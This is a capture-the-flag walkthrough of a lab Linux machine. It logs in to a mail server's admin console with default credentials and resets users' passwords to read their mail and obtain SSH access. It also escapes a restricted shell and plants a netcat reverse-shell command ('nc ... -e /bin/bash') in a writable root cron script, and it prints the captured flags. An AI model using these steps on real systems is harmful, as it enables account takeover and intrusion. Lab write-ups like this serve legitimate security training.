**Description:** It was originally created for HackTheBox

**Author:** Ch33z_plz

**Operating System:** Linux

**Aim:** To get root shell and read the flag.

## Information Gathering
### Host Discovery

The following command performs a ping scan to discover the target machine on the local network.

```bash
root@kali:~$ nmap -n -sn 192.168.179.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-04 13:56 -05
Nmap scan report for 192.168.179.185
...
```

### Port Scanning

To detect open ports a full TCP port scan was performed with nmap.

```bash
root@kali:~$ nmap -v -n -T4 -p- 192.168.179.185 -oG nmap/all.tcp-ports.txt 
...
PORT     STATE SERVICE
22/tcp   open  ssh

80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
...
```


### Service Enumeration

With the aim of discovering information about open ports running on the server, an aggressive scan was did with nmap, it enable the OS detection, version enumeration, script scanning and traceroute.

```bash
root@kali:~$ nmap -A -p22,25,80,110,119,4555 -n -v -Pn 192.168.179.185 -oN nmap/service-enum.txt

### Web Enumeration

A web page is running in the web service, but was not possible to find valuable information.

![](/assets/images/solidstate/screenshot-1.png)

The directory brute forcing with gobuster also did not disclosed information that would help to compromise the system.

```bash
root@kali:~$ gobuster dir -u http://192.168.179.185/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -x html,php,txt

### Enumeration on port 4555

By connecting on port 4545, we see that it service requires authentication, but using root as username and password we have successfull access.

```bash
root@kali:~$ telnet 192.168.179.185 4555
Trying 192.168.179.185...

Executing the **help** command we can see the list of available commands to the root user.

```bash

setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'

setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

We list the users by typing the **listusers** command.

```bash
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

We create the user **s4rgaz**.

```bash
adduser s4rgaz 123
User s4rgaz added
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: s4rgaz
user: mailadmin
quit
Bye
Connection closed by foreign host.
root@kali:~$
```

### Enumeration on service pop3

By logging in to pop3 service as user **s4rgaz**, we have successful access, so we can manage the users to be able to access to pop3 service.

```bash
root@kali:~$ telnet 192.168.179.185 110

```

We go back to the service running on port 4545 and change john’s password.

```bash
root@kali:~$ telnet 192.168.179.185 4555

We log in on pop3 service as user john, in the mail it indicates that access to **mindy** is restricted.

```bash

John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,

```

Then we change mindy’s password.

Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```


## Exploitation
### Access via SSH

We access to the server via SSH as user **mindy**.

```bash
root@kali:~$ ssh -l mindy 192.168.179.185 
mindy@192.168.179.185's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
```

We found the flag in her home directory.

```bash
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~$
```

By trying to execute some system commands, we see that we are under a restricted shell.

```bash
mindy@solidstate:~$ cd bin/
-rbash: cd: restricted
mindy@solidstate:~$ ip addr
-rbash: ip: command not found
mindy@solidstate:~
```

To bypass the jailed shell, we type **bash -i** to the SSH command.

```bash
root@kali:~$ ssh -l mindy 192.168.179.185 "bash -i"                          
mindy@192.168.179.185's password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

Now we can run any system command, a python script was found in the **/opt** directory, probably a cron job is running this file.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -la
ls -la
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 .
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
cat tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()

${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$
```

## Privilege Escalation
### Cron Job

We add the following instruction to the end of the **tmp.py** file, when the cron job executes the script, it will try to connect to my attacking machine, giving us a root shell.

```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ echo "os.system('nc 192.168.179.1 1337 -e /bin/bash')" >> tmp.py
```

We set up a netcat listener on port 1337, wait a moment and we have a root shell.

```bash
root@kali:~$ nc -vlnp 1337
listening on [any] 1337 ...
connect to [192.168.179.1] from (UNKNOWN) [192.168.179.185] 40466

root@solidstate:~# ls
ls
root.txt
root@solidstate:~# cat root.txt
cat root.txt
b4c9723a28899b1c45db281d99cc87c9
root@solidstate:~#
```
